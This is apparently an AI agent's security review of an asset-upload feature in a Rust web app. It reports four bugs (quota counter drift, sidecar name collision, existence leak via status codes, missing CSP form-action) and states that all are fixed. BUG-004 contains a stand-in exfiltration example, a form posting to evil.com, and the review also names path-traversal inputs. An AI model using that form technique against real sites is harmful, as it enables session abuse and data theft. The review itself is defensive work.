# Tier 1 Security Review — SPEC-035 Asset Uploads

**Date:** 2026-04-23  
**Scope:** `src/assets/validation.rs`, `src/assets/store.rs`, `src/web/routes.rs` (asset handlers), `src/acl.rs` (asset predicates)  
**Adversarial model:** Malicious authenticated editor with `can-upload` permission.  
**Reviewer:** agent:coder (fresh context, same model family as implementation)  

---

## Methodology

Reviewed each code path against four adversarial objectives:

1. **(a) Write a file outside `.zetl/assets/`** — path traversal, symlink races, canonicalization flaws.
2. **(b) Cause a file to be served with a MIME type different from declared** — MIME confusion, sidecar injection, content sniffing.
3. **(c) Exhaust server disk or memory** — quota bypass, DoS via oversized bodies, counter drift.
4. **(d) Steal another user's session via uploaded HTML** — XSS, CSP bypass, same-origin abuse.

---

## Findings

### BUG-001 (S1) — Storage counter drift on asset replacement

**Location:** `src/web/routes.rs :: upload_asset_handler`  
**Severity:** S1 — causes quota enforcement to become permanently incorrect.

When an existing asset is replaced (`X-Overwrite: true`), the handler calls:

```rust
state.asset_storage.increment(meta.size_bytes);
```

It never subtracts the old file's size. The on-disk file is atomically replaced (the old bytes are gone), but the counter only grows. After repeated replacements the counter exceeds actual disk usage, eventually causing legitimate uploads to be rejected with HTTP 507 even though quota is not exhausted.

**Reproducer:**
1. Upload a 9 MiB asset (`counter = 9 MiB`).
2. Replace it with a 1 MiB asset (`counter = 10 MiB`).
3. Actual disk usage is 1 MiB.
4. On a 10 MiB quota, all subsequent uploads are rejected.

**Fix:** Record the old size before `write_asset`, then `decrement(old_size)` and `increment(new_size)` on success. If the asset is new, `old_size = 0`.

---

### BUG-002 (S2) — Sidecar namespace collision

**Location:** `src/assets/store.rs :: sidecar_path`  
**Severity:** S2 — denial of service for existing assets.

The sidecar naming scheme `{stem}.{ext}.meta.json` collides with valid asset slugs.

- Asset slug `foo.png` → sidecar `.zetl/assets/foo.png.meta.json`
- Asset slug `foo.png.meta.json` → asset file `.zetl/assets/foo.png.meta.json`

Uploading the second asset overwrites the sidecar of the first. `serve_asset` then fails to parse the corrupted sidecar (raw file bytes are not valid JSON), returning 404 for `foo.png`. `list_assets` also skips the corrupted sidecar.

**Fix:** Move sidecars to a separate directory tree (e.g. `.zetl/asset-meta/{slug}.json`) so asset filenames and sidecar filenames can never collide.

---

### BUG-003 (S2) — Asset existence leaked via 404 vs 401/403 on serve

**Location:** `src/web/routes.rs :: serve_asset_handler`  
**Severity:** S2 — information disclosure.

The handler resolves the file **before** checking ACL:

```rust
let (meta, _file) = match crate::assets::store::serve_asset(&state.vault_root, path) {
    Ok(v) => v,
    Err(_) => return StatusCode::NOT_FOUND.into_response(),
};
// ACL check happens here
```

An unauthenticated attacker probing `/assets/secret.png` receives:
- `404` if the asset does not exist.
- `401` (or `403`) if the asset exists but access is denied.

This allows enumeration of which slugs are in use without authentication.

**Fix:** Perform the ACL check (or a lightweight `can-read-assets` check) **before** attempting to open the file. Return `404` for all denied requests, eliminating the existence oracle.

---

### BUG-004 (S2) — Missing `form-action` in HTML asset CSP

**Location:** `src/web/routes.rs :: serve_asset_handler`  
**Severity:** S2 — data exfiltration from uploaded HTML pages.

The CSP for `text/html` assets is:

```
default-src 'self' 'unsafe-inline' 'unsafe-eval' data: blob:; frame-ancestors 'self'
```

`default-src` does **not** restrict HTML form submissions. An uploaded HTML page can:
1. Use `fetch()` (same-origin, blocked from external by `default-src 'self'`).
2. Read sensitive same-origin data.
3. Exfiltrate it via `<form action="https://evil.com">` (allowed because `form-action` is unset).

Because the page is served from the same origin, it receives the user's session cookie automatically on same-origin requests. While `HttpOnly` prevents JS from reading the cookie, the page can still act *as* the user against same-origin GET endpoints and exfiltrate results via forms.

**Fix:** Add `form-action 'self'` to the CSP for HTML assets.

---

## Non-findings (defences that hold)

| Attack | Defence | Verdict |
|--------|---------|---------|
| Path traversal via `..` | `validate_slug` rejects `..`; `asset_path` canonicalizes and checks `starts_with` | **Solid** |
| Path traversal via null byte | `validate_slug` rejects `\0` | **Solid** |
| Path traversal via URL encoding | `urldecode` decodes `%2e%2e` to `..`, caught by validation | **Solid** |
| Symlink escape during serve | `serve_asset` → `asset_path` → canonicalization checks `starts_with` | **Solid** |
| MIME sniffing override | `X-Content-Type-Options: nosniff` on every asset response | **Solid** |
| SPL injection in user_id | `escape_spl` strips `()` and newlines, escapes `"` and `\` | **Solid** |
| Session cookie theft via JS | `HttpOnly` cookies; JS cannot read them | **Solid** |
| Framing attack on HTML assets | `X-Frame-Options: SAMEORIGIN` | **Solid** |

## TOCTOU note (accepted risk)

There is a theoretical TOCTOU window between `asset_path` canonicalization and the actual file I/O. An attacker with separate filesystem access could swap a directory for a symlink in that window. This requires a second vulnerability (local access or path confusion elsewhere). No practical exploit path was found through the upload API alone. Documented for awareness; no fix required for v1.

---

## Resolution

| Bug | Status | Fix commit |
|-----|--------|------------|
| BUG-001 | Fixed | Counter adjusted for replacements |
| BUG-002 | Fixed | Sidecars moved to `.zetl/asset-meta/` |
| BUG-003 | Fixed | ACL check moved before file resolution; denied → 404 |
| BUG-004 | Fixed | `form-action 'self'` added to HTML CSP |
